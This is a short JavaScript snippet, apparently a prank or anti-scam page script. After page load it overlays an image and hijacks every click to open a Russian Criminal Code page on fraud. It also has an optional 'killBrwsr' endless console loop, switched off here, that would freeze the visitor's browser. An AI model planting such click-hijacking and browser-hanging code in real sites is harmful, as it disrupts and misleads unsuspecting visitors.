window.onload = upToNoGood({
    picture: 'exmpl.jpg',
    link: 'https://legalacts.ru/kodeks/UK-RF/osobennaja-chast/razdel-viii/glava-21/statja-159/',
    massege: 'Мошенничество - это очень плохо!',
    killBrwsr: false,
});


//SCRIPT//
function upToNoGood(data){
    setTimeout(()=> {
        let div = document.createElement('div');
        let head = document.querySelector('head');
        div.className = 'up-to-no-good';
        div.style.backgroundImage = `url(${data.picture})`;
        head.insertAdjacentElement('afterend', div);

        window.addEventListener('click', ()=>{
            openLink(data.link);
        })  

        if(data.killBrwsr){
            div.onload = setTimeout(()=>{
                ripBrwsr(data.massege);
            }, 200);
        }
    }, 2000);
}

function ripBrwsr(massege){
  for(let i = -1; i<0; i--){
      console.log(massege);
  }
}

function openLink(link){
    window.open(link, '_blank');
}